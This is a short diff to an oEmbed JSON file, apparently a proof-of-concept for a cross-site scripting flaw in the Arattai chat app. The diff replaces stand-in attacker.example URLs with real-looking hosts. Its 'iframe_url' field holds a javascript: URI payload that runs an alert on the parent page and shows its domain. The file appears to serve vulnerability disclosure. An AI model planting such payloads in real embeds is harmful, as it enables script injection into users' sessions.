@@ -1,10 +1,10 @@
 {
   "type": "video",
   "version": "1.0",
-  "provider_url": "https://attacker.example",
+  "provider_url": "https://josangeorge.github.io/massah",
   "provider_name": "PoC Provider",
   "title": "Click to play PoC video",
-  "thumbnail_url": "https://attacker.example/thumb.png",
-  "html": "<iframe src=\"https://attacker.example/safe-embed.html\"></iframe>",
+  "thumbnail_url": "https://static.arattaicdn.com/arattai-chat/source/officechat/images/default/arattai/404-dark-min.png",
+  "html": "<iframe src=\"https://help.arattai.in/portal/en/kb/articles/end-to-end-encryption\"></iframe>",
   "iframe_url": "javascript:parent.alert('Arattai oEmbed XSS: '+parent.document.domain)"
 }
